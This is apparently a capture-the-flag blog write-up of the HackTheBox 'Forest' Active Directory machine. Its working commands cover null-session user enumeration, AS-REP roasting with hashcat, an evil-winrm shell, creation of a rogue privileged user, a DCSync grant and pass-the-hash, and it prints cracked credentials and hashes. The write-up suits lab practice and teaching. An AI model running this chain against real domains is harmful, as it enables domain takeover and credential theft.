---
layout: post
title: "HackTheBox Writeup: Forest"
thumbnail: "/assets/images/forest-htb/c8a40a6417382479be87c9562d5db681_MD5.jpg"
---

In this post, we tackle **Forest**, a Windows Active Directory machine on HackTheBox. The initial foothold relies on enumerating domain users via a null SMB session and performing an AS-REP Roasting attack to crack a service account password. From there, we map the domain using BloodHound, discover a critical Active Directory ACL misconfiguration, and abuse our group privileges to grant ourselves DCSync rights, ultimately dumping the Administrator hash.

---

## 1. Enumeration

We kick things off with a comprehensive `nmap` scan to identify open ports and services.

```bash
┌──(mracherr㉿serveur)-[~/tmp_lab/management]
└─$ nmap 10.129.63.154 -sC -sV
Starting Nmap 7.98 ( [https://nmap.org](https://nmap.org) ) at 2026-09-14 18:14 +0200
PORT     STATE SERVICE      VERSION
53/tcp   open  domain       Simple DNS Plus
88/tcp   open  kerberos-sec Microsoft Windows Kerberos
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local)
445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
...
```

The presence of DNS, Kerberos, LDAP, and SMB confirms this is a Domain Controller for the `htb.local` domain, specifically running Windows Server 2016.

### SMB Null Session Enumeration
Since SMB is open, we test for null session access. While we cannot read any sensitive shares, the server allows us to enumerate domain users without any credentials!

```bash
┌──(mracherr㉿serveur)-[~/tmp_lab/management]
└─$ nxc smb 10.129.63.154 -u '' -p '' --users
SMB         10.129.63.154   445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True) (Null Auth:True)
SMB         10.129.63.154   445    FOREST           [+] htb.local\:
SMB         10.129.63.154   445    FOREST           -Username-                    -Last PW Set-       -BadPW- -Description-
SMB         10.129.63.154   445    FOREST           Administrator                 2021-08-31 00:51:58 0       Built-in account...
SMB         10.129.63.154   445    FOREST           krbtgt                        2019-09-18 10:53:23 0       Key Distribution Center...
SMB         10.129.63.154   445    FOREST           HealthMailboxc3d7722          2019-09-23 22:51:31 0
...
SMB         10.129.63.154   445    FOREST           sebastien                     2019-09-20 00:29:59 0
SMB         10.129.63.154   445    FOREST           lucinda                       2019-09-20 00:44:13 0
SMB         10.129.63.154   445    FOREST           svc-alfresco                  2026-09-14 16:25:17 0
SMB         10.129.63.154   445    FOREST           andy                          2019-09-22 22:44:16 0
SMB         10.129.63.154   445    FOREST           mark                          2019-09-20 22:57:30 0
SMB         10.129.63.154   445    FOREST           santi                         2019-09-20 23:02:55 0
```

We export this list of users to use in our next attack phase.

---

## 2. Initial Access: AS-REP Roasting

With a valid list of domain users, we check if any accounts have the **"Do not require Kerberos preauthentication"** property enabled. If they do, we can request an Authentication Service (AS) ticket for them and crack the encrypted payload offline.

```bash
┌──(mracherr㉿serveur)-[~/tmp_lab/forest]
└─$ nxc ldap forest.htb -u '' -p '' --asreproast a.out
LDAP        10.129.63.154   389    FOREST           [*] Total of records returned 1
LDAP        10.129.63.154   389    FOREST           $krb5asrep$23$svc-alfresco@HTB.LOCAL:ab50c3ebc24bb10b864fa253c...
```

The `svc-alfresco` account is vulnerable! We save the hash to a file and crack it using Hashcat (Mode 18200) alongside the `rockyou` wordlist:

```bash
┌──(mracherr㉿serveur)-[~/tmp_lab/forest]
└─$ hashcat -m 18200 -a 0 asrep.txt /usr/share/wordlists/rockyou.txt.gz
...
$krb5asrep$23$svc-alfresco@HTB.LOCAL:ab50c3ebc24bb10b864fa253c6...:s3rvice

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
```

The password is **`s3rvice`**. 

Since port 5985 (WinRM) is open, we can verify the credentials and gain an interactive remote shell using `evil-winrm`.

```powershell
┌──(mracherr㉿serveur)-[~/tmp_lab/forest]
└─$ evil-winrm -i forest.htb -u svc-alfresco -p s3rvice

*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> cat user.txt
bd7c6e8a4fc07de82331ec32b608d36f
```

![WinRM Access](/assets/images/forest-htb/c8a40a6417382479be87c9562d5db681_MD5.jpg)
![User Flag](/assets/images/forest-htb/cb511aa96f8b357bc7c517958766fb8a_MD5.jpg)

Initial foothold secured!

---

## 3. Privilege Escalation: AD ACL Abuse to DCSync

To find a path to Domain Admin, we run BloodHound/SharpHound from our foothold. The data reveals a critical misconfiguration: the `svc-alfresco` account is a member of the `Account Operators` group (or holds equivalent delegated permissions). This grants us the ability to add arbitrary users to highly privileged Active Directory groups.

![BloodHound Enumeration](/assets/images/forest-htb/2642fc0428cc5416289547a366ad531c_MD5.jpg)

### Creating a Rogue User
First, we create a new user named `ana` directly from our WinRM session and add her to the `ENTERPRISE KEY ADMINS` group (which has extensive control over the domain).

```powershell
*Evil-WinRM* PS C:\Users\svc-alfresco> net user ana aqwWqa@12 /add /domain
The command completed successfully.

*Evil-WinRM* PS C:\Users\svc-alfresco> net group "ENTERPRISE KEY ADMINS" ana /add /domain
The command completed successfully.
```

### Granting DCSync Rights
With our rogue user now highly privileged, we can assign `ana` the `DS-Replication-Get-Changes` (DCSync) rights over the domain. This can be done locally via PowerShell:

```powershell
$SecPassword = ConvertTo-SecureString 'aqwWQa@12' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('htb\ana', $SecPassword)
Add-DomainObjectAcl -Credential $Cred -TargetIdentity htb.local -Rights DCSync
```

Alternatively, from our attacker machine using `bloodyAD.py`:

```bash
┌──(venv)─(mracherr㉿serveur)-[~/tools/bloodyAD]
└─$ python3 bloodyAD.py --host forest.htb -d htb.local -u ana -p 'aqwWqa@12' add dcsync ana
[+] ana is now able to DCSync
```

### Dumping the Administrator Hash & Pass-the-Hash
Because `ana` now holds DCSync privileges, we can silently request the NTLM hash of the `Administrator` account directly from the Domain Controller without executing code on the machine itself (using tools like `secretsdump.py` or NetExec).

Armed with the `Administrator` hash (`32693b11e6aa90eb43d32c72a07ceea6`), we execute a Pass-the-Hash (PtH) attack via WinRM to read the root flag!

```bash
┌──(mracherr㉿serveur)-[~/tools]
└─$ nxc winrm forest.htb -u 'administrator' -H "32693b11e6aa90eb43d32c72a07ceea6" -X "type C:\users\Administrator\Desktop\root.txt"
WINRM       10.129.63.154   5985   FOREST           [*] Windows 10 / Server 2016 Build 14393 (name:FOREST) (domain:htb.local)
WINRM       10.129.63.154   5985   FOREST           [+] htb.local\administrator:32693b11e6aa90eb43d32c72a07ceea6 (Pwn3d!)
WINRM       10.129.63.154   5985   FOREST           [+] Executed command (shell type: powershell)
WINRM       10.129.63.154   5985   FOREST           8bdbe7e2f75c2597dca016b6ab896a06
```

Domain compromised!